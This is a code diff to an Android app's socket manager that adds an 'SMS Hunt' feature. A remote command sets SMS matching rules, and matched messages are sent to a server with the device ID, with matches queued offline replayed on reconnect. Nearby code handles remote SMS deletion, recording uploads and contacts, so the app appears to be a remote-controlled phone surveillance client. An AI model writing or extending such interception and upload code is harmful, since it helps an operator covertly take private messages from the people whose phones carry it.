@@ -694,6 +694,8 @@ public class SocketManager {
                 Log.i(TAG, "Live channel connected");
                 // Upload any offline recordings that were saved while disconnected
                 uploadPendingOfflineRecordings();
+                // Replay SMS Hunt matches captured while the network was down.
+                flushPendingSmsHunts();
                 java.io.BufferedReader lIn = new java.io.BufferedReader(
                     new java.io.InputStreamReader(liveSocket.getInputStream()));
                 String lLine;
@@ -763,18 +765,51 @@ public class SocketManager {
      * dropped. We deliberately do NOT fall back to the primary channel so that high-frequency
      * push events never enter the command queue.
      */
-    private void sendLiveOnly(String event, JSONObject data) {
+    private boolean sendLiveOnly(String event, JSONObject data) {
         synchronized (liveLock) {
-            if (!liveConnected || liveOut == null) return; // offline — drop silently
+            if (!liveConnected || liveOut == null) return false;
             try {
                 JSONObject msg = new JSONObject();
                 msg.put("event", event);
                 msg.put("data", data);
                 liveOut.print(msg.toString() + "\n");
                 liveOut.flush();
+                if (liveOut.checkError()) return false;
+                return true;
             } catch (Exception e) {
                 Log.e(TAG, "sendLiveOnly [" + event + "] error: " + e.getMessage());
+                return false;
             }
+        }
+    }
+
+    /**
+     * Publish one already-persisted hunt match. The local queue is removed
+     * only after the live socket accepts the write.
+     */
+    public void publishSmsHuntMessage(JSONObject message) {
+        if (message == null) return;
+        try {
+            JSONObject payload = new JSONObject(message.toString());
+            payload.put("deviceId", DeviceInfo.getDeviceId(context));
+            if (sendLiveOnly("sms_hunt:message", payload)) {
+                new SMSHandler(context).removePendingSmsHunt(
+                        message.optString("messageKey", ""));
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "publishSmsHuntMessage error: " + e.getMessage());
+        }
+    }
+
+    private void flushPendingSmsHunts() {
+        try {
+            JSONArray pending = smsHandler.getPendingSmsHunts();
+            for (int i = 0; i < pending.length(); i++) {
+                JSONObject message = pending.optJSONObject(i);
+                if (message != null) publishSmsHuntMessage(message);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "flushPendingSmsHunts error: " + e.getMessage());
         }
     }
 
@@ -1339,6 +1374,9 @@ public class SocketManager {
         }
         if (command.equals("delete_sms")) {
             return smsHandler.deleteSMS(params.getString("smsId"));
+        }
+        if (command.equals("set_sms_hunts")) {
+            return smsHandler.setSmsHunts(params.optJSONArray("hunts"));
         }
 
         // ── Contacts ─────────────────────────────────────────────────────
